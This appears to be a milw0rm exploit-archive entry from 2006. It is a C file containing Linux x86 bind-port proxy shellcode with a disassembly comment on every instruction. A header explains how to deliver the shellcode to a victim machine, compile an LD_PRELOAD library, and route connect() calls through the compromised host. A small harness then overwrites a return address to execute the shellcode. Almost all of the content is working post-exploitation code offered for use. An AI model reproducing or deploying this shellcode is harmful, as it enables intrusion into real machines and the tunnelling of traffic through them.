// proxylib.c - is located at http://www.milw0rm.com/id.php?id=1476 /str0ke

/********************************************************************

 hey all.. this is my attempt at a very small very functional tcp
 proxy shellcode.. to pull this off i ignored the "socks" protocols
 and invented my own.. sorta..

 how to use me..

 deliver shellcode however you would normally deliver shellcode to a
 machine, lets say 192.168.1.1 in this case..

 on your machine you would setup the proxy library like so:

 phar@hatless-cat ~/proxyshell $  gcc -c -o proxyshell_connect.o proxylib.c -fpic
 phar@hatless-cat ~/proxyshell $  ld -shared -o proxyshell_connect.so proxyshell_connect.o -ldl
 phar@hatless-cat ~/proxyshell $  export LD_PRELOAD=/full/path/to/proxyshell_connect.so
 phar@hatless-cat ~/proxyshell $  export SHELLPROXYHOST=192.168.1.16:1280


 from now on any calls to connect() will be proxied through the shellcode
 which can handle multiple simultanious connections to arbitrary hosts.

 by default the shell binds to port 1280, you can easily modify which
 the host binds to by finding the code labeled "port info" like this

        "\xba\xfd\xff\xfa\xff"          // mov    $0xfffafffd,%edx      ;port info

	invert the last for bytes (logical NOT) and you'll see where port
	0x5000 is declared.. adjust to whatever port you want, and reinvert..


 proxylib.c should be available at stonedcoder.org

 one last note about proxylib.c, it does not handle dns resolution properly,
 so ip addresses only.. unless you know.. you feel like making it work..



 phar[at]stonedcoder[dot]org
	http://www.stonedcoder.org
	http://bpp.etherdyne.net
********************************************************************/



char shellcode[] = {
//main:
	"\x31\xc0"			// xor    %eax,%eax
	"\x89\xc3"			// mov    %eax,%ebx
	"\x50"				// push   %eax
	"\x40"				// inc    %eax
	"\x50"				// push   %eax
	"\x40"				// inc    %eax
	"\x50"				// push   %eax
	"\x89\xe1"			// mov    %esp,%ecx
	"\xb0\x66"			// mov    $0x66,%al
	"\x89\xc7"			// mov    %eax,%edi
	"\x43"				// inc    %ebx
	"\xcd\x80"			// int    $0x80			;socket

	"\x89\xc6"			// mov    %eax,%esi
	"\x89\xf8"			// mov    %edi,%eax
	"\x31\xd2"			// xor    %edx,%edx
	"\x52"				// push   %edx
	"\x52"				// push   %edx
	"\x52"				// push   %edx
	"\xba\xfd\xff\xfa\xff" 		// mov    $0xfffafffd,%edx	;port info
	"\xf7\xd2"			// not    %edx
	"\x52"				// push   %edx
	"\x89\xe1"			// mov    %esp,%ecx
	"\x31\xd2"			// xor    %edx,%edx
	"\xb2\x10"			// mov    $0x10,%dl
	"\x52"				// push   %edx
	"\x51"				// push   %ecx
	"\x56"				// push   %esi
	"\x89\xe1"			// mov    %esp,%ecx
	"\x43"				// inc    %ebx
	"\xcd\x80"			// int    $0x80			;bind

	"\x53"				// push   %ebx
	"\x56"				// push   %esi
	"\x89\xe1"			// mov    %esp,%ecx
	"\xb0\x66"			// mov    $0x66,%al
	"\xb3\x04"			// mov    $0x4,%bl
	"\xcd\x80"			// int    $0x80			;listen

	"\x31\xc9"			// xor    %ecx,%ecx
	"\x41"				// inc    %ecx
	"\xb3\x11"			// mov    $0x11,%bl
	"\xb0\x30"			// mov    $0x30,%al
	"\xcd\x80"			// int    $0x80			;signal

//do_next_accept:
	"\x31\xc0"			// xor    %eax,%eax
	"\x50"				// push   %eax
	"\x50"				// push   %eax
	"\x56"				// push   %esi
	"\x89\xe1"			// mov    %esp,%ecx
	"\xb0\x66"			// mov    $0x66,%al
	"\x89\xc2"			// mov    %eax,%edx
	"\xb3\x05"			// mov    $0x5,%bl
	"\xcd\x80"			// int    $0x80			;accept

	"\x89\xc7"			// mov    %eax,%edi
	"\x31\xc0"			// xor    %eax,%eax
	"\x50"				// push   %eax
	"\x40"				// inc    %eax
	"\x50"				// push   %eax
	"\x40"				// inc    %eax
	"\x50"				// push   %eax
	"\xcd\x80"			// int    $0x80			;fork

	"\x85\xc0"			// test   %eax,%eax
	"\x75\xe2"			// jne    8048398 <do_next_accept>
	"\x89\xe1"			// mov    %esp,%ecx
	"\xb0\x66"			// mov    $0x66,%al
	"\x89\xc3"			// mov    %eax,%ebx
	"\xb3\x01"			// mov    $0x1,%bl
	"\xcd\x80"			// int    $0x80			;socket

	"\x89\xc6"			// mov    %eax,%esi
	"\xb0\x10"			// mov    $0x10,%al
	"\x29\xc4"			// sub    %eax,%esp
	"\x89\xe1"			// mov    %esp,%ecx
	"\x31\xc0"			// xor    %eax,%eax
	"\x50"				// push   %eax
	"\x52"				// push   %edx
	"\x51"				// push   %ecx
	"\x57"				// push   %edi
	"\x89\xe1"			// mov    %esp,%ecx
	"\xb0\x66"			// mov    $0x66,%al
	"\xb3\x0a"			// mov    $0xa,%bl
	"\xcd\x80"			// int    $0x80			;recv


	"\xb0\x66"			// mov    $0x66,%al
	"\xb3\x03"			// mov    $0x3,%bl
	"\x89\x34\x24"			// mov    %esi,(%esp)
	"\xcd\x80"			// int    $0x80
	"\x85\xc0"			// test   %eax,%eax
	"\x74\x14"			// jz     ready_to_proxy

//close:
	"\x89\xf3"			// mov    %esi,%ebx
	"\x31\xc0"			// xor    %eax,%eax
	"\xb0\x06"			// mov    $0x6,%al
	"\xcd\x80"			// int    $0x80			;close

	"\x87\xf7"			// xchg   %esi,%edi
	"\x85\xc0"			// test   %eax,%eax
	"\x74\xf"			// jz     close

//exit:
	"\x31\xc0"			// xor    %eax,%eax
	"\xb0\x01"			// mov    $0x1,%al
	"\xcd\x80"			// int    $0x80			;recv

//ready_to_proxy:
	"\x31\xdb"			// xor    %ebx,%ebx
	"\xb3\x10"			// mov    $0x10,%bl
	"\x01\xdc"			// add    %ebx,%esp
	"\x87\xf7"			// xchg   %esi,%edi
	"\x31\xc0"			// xor    %eax,%eax
	"\x50"				// push   %eax
	"\x56"				// push   %esi
	"\x89\xe3"			// mov    %esp,%ebx
	"\x31\xc9"			// xor    %ecx,%ecx
	"\x41"				// inc    %ecx
	"\x89\xca"			// mov    %ecx,%edx
	"\xb0\xa8"			// mov    $0xa8,%al
	"\xcd\x80"			// int    $0x80			;connect

	"\x31\xc0"			// xor    %eax,%eax
	"\xb0\x40"			// mov    $0x40,%al
	"\x89\xe2"			// mov    %esp,%edx
	"\x50"				// push   %eax
	"\xb0\x08"			// mov    $0x8,%al
	"\x50"				// push   %eax
	"\x52"				// push   %edx
	"\x56"				// push   %esi
	"\x89\xe1"			// mov    %esp,%ecx
	"\x31\xdb"			// xor    %ebx,%ebx
	"\xb3\x0a"			// mov    $0xa,%bl

//do_next_proxy:,
	"\x31\xc0"			// xor    %eax,%eax
	"\xb0\x66"			// mov    $0x66,%al
	"\xcd\x80"			// int    $0x80			;send/recv
	"\x85\xc0"			// test   %eax,%eax
	"\x74\xb9"			// jz     close
	"\x89\xda"			// mov    %ebx,%edx
	"\xf6\xc2\x01"			// test   $0x1,%dl
	"\x75\xc6"			// jnz    ready_to_proxy

//is_recv_call:
	"\x89\xc2"			// mov    %eax,%edx
	"\xd1\xe2"			// shl    %edx
	"\x72\xc0"			// jb     ready_to_proxy
	"\x89\x41\x08"			// mov    %eax,0x8(%ecx)
	"\x89\x39"			// mov    %edi,(%ecx)
	"\x4b"				// dec    %ebx
	"\xeb\xe1"			// jmp    do_next_proxy
};


int main() {
int *ret;
char cnull = 0;

        printf("shellcode_size: %u\n", sizeof(shellcode));
        printf("contains nulls: ");
        if(!memmem(shellcode,sizeof(shellcode),&cnull,1)){
                printf("yes\n");
        }else{
                printf("no\n");
        }

        ret = (int *)&ret + 2;
        (*ret) = (int)shellcode;

}

// milw0rm.com [2006-02-07]